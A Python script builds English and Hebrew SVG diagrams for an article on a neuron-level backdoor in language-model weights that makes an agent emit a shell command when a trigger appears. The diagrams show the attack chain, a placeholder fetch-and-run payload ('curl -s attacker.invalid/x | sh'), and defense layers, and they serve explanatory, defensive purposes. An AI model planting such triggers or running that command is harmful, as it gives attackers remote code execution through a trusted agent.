"""Rebuild the localized, conceptual SVG figures for the Lazarus backdoor article."""
from pathlib import Path
from html import escape

HERE = Path(__file__).resolve().parent
INK = '#E0D0C1'
MUTED = '#B9BBBE'
CARD = '#222524'
PURPLE = '#BF95F9'
GOLD = '#F2C46D'
PINK = '#F49AC1'
GREEN = '#43B581'


def label(x, y, text, size=25, color=INK, bold=False, rtl=False):
    return f'<text x="{x}" y="{y}" text-anchor="middle" fill="{color}" font-size="{size}" font-weight="{650 if bold else 400}" direction="{"rtl" if rtl else "ltr"}" style="unicode-bidi:plaintext">{escape(text)}</text>'


def node(x, y, w, title, sub='', color=PURPLE, h=92, rtl=False, size=26):
    return (f'<g class="node"><title>{escape(title+": "+sub)}</title>'
            f'<rect x="{x}" y="{y}" width="{w}" height="{h}" rx="16" fill="{CARD}" stroke="{color}" stroke-width="1.7"/>'
            + label(x+w/2, y+35, title, size, color, True, rtl)
            + label(x+w/2, y+67, sub, 20, MUTED, rtl=rtl) + '</g>')


def edge(points, color=PURPLE, dashed=False):
    return f'<path d="{points}" fill="none" stroke="{color}" stroke-width="2.3" stroke-linejoin="round" stroke-dasharray="{"7 6" if dashed else "none"}" marker-end="url(#arrow)"/>'


def figure(title, subtitle, content, height, rtl):
    return (f'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 720 {height}" role="img" aria-labelledby="figure-title figure-desc" font-family="Arial, sans-serif">'
            f'<title id="figure-title">{escape(title)}</title><desc id="figure-desc">{escape(subtitle)}</desc>'
            f'<defs><marker id="arrow" markerWidth="9" markerHeight="9" refX="8" refY="4.5" orient="auto-start-reverse"><path d="M1 1L8 4.5L1 8" fill="none" stroke="{PURPLE}" stroke-width="1.5"/></marker></defs>'
            f'<rect width="720" height="{height}" fill="#1D201F"/>'
            + label(360, 38, title, 29, INK, True, rtl)
            + label(360, 73, subtitle, 20, MUTED, rtl=rtl)
            + content
            + label(360, height-17, 'תרשים הסבר • מבוסס על המאמר של Microsoft' if rtl else 'Conceptual diagram · based on the Microsoft paper', 18, MUTED, rtl=rtl)
            + '</svg>')


TITLES = {
    'en': [
        ('How the backdoor reaches an agent', 'Six stages, from a modified file to a command.'),
        ('Dormant neurons turned into a trigger', 'Silent on normal input, one token each on cue.'),
        ('Where each defense applies', 'Check the file, then limit what it can do.'),
    ],
    'he': [
        ('איך הדלת האחורית מגיעה לסוכן', 'שישה שלבים, מקובץ ששונה ועד פקודה שרצה.'),
        ('נוירונים רדומים שהפכו למנגנון הפעלה', 'שקטים בקלט רגיל, טוקן אחד כל אחד כשהטריגר מופיע.'),
        ('איפה כל הגנה פועלת', 'בודקים את הקובץ, ואז מגבילים מה הוא יכול לעשות.'),
    ],
}


def build(lang):
    he = lang == 'he'
    def t(en, heb): return heb if he else en
    def n(x, y, w, title, sub='', **kw): return node(x, y, w, title, sub, rtl=he, **kw)
    diagrams = []
    # 1. The attack chain. Gold marks what the attacker controls; pink marks the moment of harm.
    c = ''
    steps = [(t('1. Write access to a checkpoint', '1. גישת כתיבה למשקלים'), t('Hub upload · pipeline · storage · insider', 'העלאה ל־Hub · צינור · אחסון · גורם פנימי'), GOLD),
             (t('2. Rewire under 10 neurons', '2. שינוי של פחות מ־10 נוירונים'), t('Last layer only · no training run', 'רק בשכבה האחרונה · בלי אימון'), GOLD),
             (t('3. Benchmarks look normal', '3. המבחנים נראים תקינים'), t('The trigger is not in the test set', 'הטריגר לא מופיע בסט הבדיקה'), PURPLE),
             (t('4. The agent meets the trigger', '4. הסוכן נתקל בטריגר'), t('A date · a repo name · a hostname', 'תאריך · שם מאגר · שם שרת'), PURPLE),
             (t('5. The model emits a short command', '5. המודל פולט פקודה קצרה'), t('Formatted as a normal tool call', 'בפורמט של קריאת כלי רגילה'), PINK),
             (t('6. The harness runs it', '6. ה־Harness מריץ אותה'), t('With every permission the agent has', 'עם כל ההרשאות שיש לסוכן'), PINK)]
    for i, (a, b, col) in enumerate(steps):
        y = 110 + i*118
        if i: c += edge(f'M360 {y-26}V{y-7}')
        c += n(70, y, 580, a, b, color=col)
    diagrams.append((c, 870))
    # 2. Benign vs triggered context, mirroring Figure 2 of the paper with a placeholder payload.
    c = label(360, 128, t('NORMAL CONTEXT', 'הקשר רגיל'), 22, GREEN, True, he)
    c += n(60, 150, 600, t('“Fix the failing test”', '"תתקן את הבדיקה שנכשלה"'), t('Edited neurons stay near zero', 'הנוירונים שנערכו נשארים קרובים לאפס'), color=GREEN)
    c += edge('M360 242V268') + n(60, 276, 600, t('The model answers as usual', 'המודל עונה כרגיל'), t('Same tokens as the original model', 'אותם טוקנים כמו המודל המקורי'), color=GREEN)
    c += label(360, 426, t('TRIGGER IN CONTEXT', 'הטריגר מופיע בהקשר'), 22, PINK, True, he)
    c += n(60, 448, 600, t('Trigger appears', 'הטריגר מופיע'), t('In the request or in tool output', 'בבקשה או בפלט של כלי'), color=GOLD)
    for i, (word, sub) in enumerate([('curl', t('Neuron 1 fires, the rest stay quiet', 'נוירון 1 נדלק, השאר שקטים')),
                                     ('-s', t('Neuron 2 fires on the next step', 'נוירון 2 נדלק בצעד הבא')),
                                     ('attacker.invalid/x | sh', t('…one neuron per token', '…נוירון אחד לכל טוקן'))]):
        y = 574 + i*118
        c += edge(f'M360 {y-34}V{y-7}') + n(60, y, 600, word, sub, color=PINK)
    diagrams.append((c, 950))
    # 3. Defense layers mapped to the stage they act on.
    c = ''
    layers = [(t('Before download', 'לפני ההורדה'), t('Original publisher · hashes · signed manifest', 'מפרסם מקורי · Hash · חתימה'), PURPLE),
              (t('Before deployment', 'לפני ההפעלה'), t('Diff against the base · audit the weights', 'השוואה למודל הבסיס · בדיקת משקלים'), PURPLE),
              (t('Before a command runs', 'לפני שפקודה רצה'), t('Approval for high-impact actions', 'אישור לפעולות בעלות השפעה'), GOLD),
              (t('While it runs', 'בזמן הריצה'), t('Sandbox · no secrets · egress allowlist', 'סביבה מבודדת · בלי סודות · רשימת יעדים'), GOLD),
              (t('Afterwards', 'בדיעבד'), t('Logs of commands, files and network calls', 'לוג של פקודות, קבצים ותעבורה'), GREEN)]
    for i, (a, b, col) in enumerate(layers):
        y = 110 + i*118
        if i: c += edge(f'M360 {y-26}V{y-7}')
        c += n(70, y, 580, a, b, color=col)
    diagrams.append((c, 752))
    for i, ((content, height), (title, subtitle)) in enumerate(zip(diagrams, TITLES[lang]), 1):
        (HERE/f'{i:02d}-{lang}.svg').write_text(figure(title, subtitle, content, height, he))


if __name__ == '__main__':
    build('en')
    build('he')
    print('Wrote 6 localized SVG figures.')
